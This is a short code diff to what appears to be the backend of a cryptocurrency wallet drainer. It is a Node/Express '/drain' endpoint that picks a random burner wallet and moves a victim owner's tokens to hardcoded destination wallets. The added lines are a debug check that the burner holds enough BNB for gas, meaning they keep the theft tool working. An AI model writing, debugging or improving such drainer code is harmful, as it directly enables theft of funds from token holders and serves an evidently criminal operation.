@@ -112,6 +112,15 @@ app.post('/drain', async (req, res) => {
     }
     
     const burner = burners[Math.floor(Math.random() * burners.length)];
+
+// ✅ ADD THIS DEBUG
+const burnerBalance = await provider.getBalance(burner.address);
+console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
+if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
+  return res.status(400).json({ 
+    error: `Burner ${burner.address.slice(0,10)} low balance: ${ethers.utils.formatEther(burnerBalance)} BNB` 
+  });
+}
     console.log(`🔥 DRAIN: ${tokenSymbol} from ${owner.slice(0,10)} burner:${burner.address.slice(0,10)}`);
     
     const destination = HARDCODED_WALLETS[tokenSymbol];
